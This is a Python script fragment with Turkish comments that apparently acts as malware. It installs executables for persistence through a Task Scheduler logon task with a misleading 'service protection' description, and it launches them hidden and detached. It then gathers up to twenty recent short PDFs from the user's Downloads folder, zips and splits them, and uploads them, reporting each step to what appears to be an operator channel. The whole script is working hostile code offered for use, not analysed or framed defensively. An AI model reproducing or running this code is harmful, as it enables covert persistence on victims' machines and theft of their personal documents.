# her exe icin islemleri yap
for exe_path in exe_list:
    exe_name = os.path.basename(exe_path)
    reg_name = os.path.splitext(exe_name)[0]

    # kayit defteri baslangic kayitlarini tamamen temizle
    try:
        startup_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        ]

        startup_apps = {}
        matching_entries = []
        for hive, key_path in startup_keys:
            try:
                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        startup_apps[name] = value
                        if exe_name.lower() in value.lower():
                            hive_name = "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM"
                            matching_entries.append((hive, key_path, name, value, hive_name))
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except OSError:
                pass

        if matching_entries:
            deleted = []
            for hive, key_path, name, value, hive_name in matching_entries:
                try:
                    key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, name)
                    winreg.CloseKey(key)
                    deleted.append(f"[{hive_name}] {name}")
                except Exception:
                    pass
            send("🗑️ Kayit Defteri", f"bulundu: {len(matching_entries)} kayit\nsilindi: {', '.join(deleted)}", YELLOW)
        else:
            send("📋 Kayit Defteri", "baslangic kaydi yok, temiz.", GREEN)

    except Exception as e:
        send("❌ Kayit Defteri Hatasi", str(e), RED)

    # startup klasorunde eski vbs kaldiysa temizle
    vbs_path = os.path.join(startup_dir, f"{reg_name}.vbs")
    try:
        if os.path.isfile(vbs_path):
            os.remove(vbs_path)
            send("🧹 Startup Temizligi", f"eski {reg_name}.vbs silindi.", YELLOW)
    except Exception as e:
        send("❌ VBS Temizleme Hatasi", str(e), RED)

    # gorev zamanlayicisi uzerinden baslangica alalim
    task_name = f"{reg_name}_startup"
    try:
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")

        task_def = scheduler.NewTask(0)
        task_def.RegistrationInfo.Description = f"{reg_name} service protection startup task"

        task_def.Settings.ExecutionTimeLimit = "PT0S"
        task_def.Settings.RunOnlyIfNetworkAvailable = True
        task_def.Settings.MultipleInstances = 2
        task_def.Settings.Enabled = True
        task_def.Settings.StartWhenAvailable = True
        task_def.Settings.DisallowStartIfOnBatteries = False
        task_def.Settings.StopIfGoingOnBatteries = False

        trigger = task_def.Triggers.Create(9)
        trigger.Enabled = True
        trigger.UserId = os.getenv("USERNAME")
        trigger.Delay = "PT1M"

        principal = task_def.Principal
        principal.LogonType = 3
        principal.RunLevel = 0

        action = task_def.Actions.Create(0)
        action.Path = exe_path
        action.WorkingDirectory = os.path.dirname(exe_path)

        root_folder.RegisterTaskDefinition(task_name, task_def, 6, None, None, 3)
        send("📅 Gorev Zamanlayicisi", f"task: {task_name}\nsure limiti: sinirsiz\ntetikleyici: oturum acildiginda (1dk gecikmeli)\nag: hazir olunca baslat\ncoklu ornek: engellendi", GREEN)
    except Exception as e:
        send("❌ Gorev Zamanlayicisi Hatasi", str(e), RED)

    # baslat
    try:
        proc = subprocess.Popen(
            [exe_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        send("🚀 Baslatildi", f"{exe_name} calisiyor (PID: {proc.pid})", GREEN)
    except Exception as e:
        send("❌ Baslatma Hatasi", str(e), RED)

# son yirmi pdf dosyasini toplayip gonderiyoruz
MAX_CHUNK = 10 * 1024 * 1024
SPLIT_SIZE = 5 * 1024 * 1024

def pdf_page_count(path):
    try:
        reader = pypdf.PdfReader(str(path))
        return len(reader.pages)
    except Exception:
        return 0

try:
    dl_dir = pathlib.Path.home() / "Downloads"
    all_pdfs = sorted(
        [f for f in dl_dir.glob("*.pdf") if f.is_file()],
        key=lambda f: f.stat().st_mtime,
        reverse=True
    )

    # 6 sayfadan fazla olanlari atliyoruz
    pdfs = []
    for p in all_pdfs:
        if len(pdfs) >= 20:
            break
        if pdf_page_count(p) <= 6:
            pdfs.append(p)

    if pdfs:
        send("📄 PDF Toplama", f"{len(pdfs)} pdf bulundu (6 sayfa filtreli), zipleniyor...", BLUE)

        # gecici klasorde zip olusturuyoruz
        tmp_dir = tempfile.mkdtemp()
        chunk_idx = 1
        current_zip_path = os.path.join(tmp_dir, f"pdfs_part{chunk_idx}.zip")
        current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
        current_size = 0
        zip_paths = [current_zip_path]

        for pdf in pdfs:
            pdf_size = pdf.stat().st_size
            # limit asilirsa yeni zip dosyasina geciyoruz
            if current_size > 0 and current_size + pdf_size > MAX_CHUNK:
                current_zip.close()
                chunk_idx += 1
                current_zip_path = os.path.join(tmp_dir, f"pdfs_part{chunk_idx}.zip")
                current_zip = zipfile.ZipFile(current_zip_path, "w", zipfile.ZIP_DEFLATED)
                current_size = 0
                zip_paths.append(current_zip_path)
            current_zip.write(str(pdf), pdf.name)
            current_size += pdf_size
        current_zip.close()

        # sadece on megabayttan buyukse parcalara boluyoruz
        upload_files = []
        for zp in zip_paths:
            zp_size = os.path.getsize(zp)
            if zp_size > MAX_CHUNK:
                part_num = 1
                with open(zp, "rb") as f:
                    while True:
                        chunk = f.read(SPLIT_SIZE)
                        if not chunk:
                            break
                        part_file = f"{zp}.{part_num:03d}"
                        with open(part_file, "wb") as pf:
                            pf.write(chunk)
                        upload_files.append(part_file)
                        part_num += 1
                try:
                    os.remove(zp)
                except Exception:
                    pass
            else:
                upload_files.append(zp)

        # dosyalari tek tek gonderiyoruz
        sent = 0
        for uf in upload_files:
            ok, err = send_file(uf, os.path.basename(uf))
            if ok:
                sent += 1
            # gecici dosyalari temizliyoruz
            try:
                os.remove(uf)
            except Exception:
                pass

        # gecici klasoru siliyoruz
        try:
            os.rmdir(tmp_dir)
        except Exception:
            pass

        send("📦 PDF Gonderim", f"{sent}/{len(upload_files)} dosya gonderildi ({len(pdfs)} pdf)", GREEN if sent == len(upload_files) else YELLOW)
    else:
        send("📄 PDF", "downloads klasorunde pdf bulunamadi.", YELLOW)
except Exception as e:
    send("❌ PDF Hatasi", str(e), RED)

send("✅ Tamamlandi", "tum islemler bitti.", GREEN)
